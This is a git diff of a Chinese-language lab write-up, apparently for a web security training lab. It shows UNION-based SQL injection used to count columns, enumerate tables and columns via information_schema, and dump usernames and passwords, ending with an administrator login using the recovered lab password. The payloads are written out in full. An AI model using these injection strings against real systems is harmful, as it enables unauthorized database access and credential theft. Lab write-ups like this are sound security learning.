@@ -20,7 +20,7 @@
 隨意選擇一種類別標籤，並使用 `UNION` 語句獲取欄位數量：
 
 ```sql
-Accessories' UNION SELECT NULL,NULL--
+Pets' UNION SELECT NULL,NULL--
 ```
 
 ![alt text](image-25.png)
@@ -34,5 +34,33 @@ Accessories' UNION SELECT NULL,NULL--
 
 ![alt text](image-26.png)
 
-> 由目前注入的語句來看，也能判定此資料庫絕對不是 MySQL。
+> 由目前注入的語句來看，因為 `--` 後面沒加空格，因此也能判定此資料庫絕對不是 MySQL。
 
+---
+
+選擇 `table_name` 取得所有表名：
+
+```sql
+0' UNION SELECT NULL,table_name FROM information_schema.tables--
+```
+
+![alt text](image-27.png)
+
+有非常多表，經過猜測並一一嘗試後，在 `users_rfclnx` 這張表找到欄位有帳號與密碼：
+
+```sql
+0' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users_rfclnx'--
+```
+
+![alt text](image-28.png)
+
+從表 `users_rfclnx` 選取帳號與密碼兩欄位：
+
+```sql
+0' UNION SELECT username_bblgbb,password_ezhdgh FROM users_rfclnx--
+```
+
+![alt text](image-29.png)
+
+點選網站有上角的 `My account`，使用剛獲取的憑證進行登入，帳號 `administrator`、密碼 `dwe6w4em5t7o5niofw0w`：
+![alt text](image-30.png)
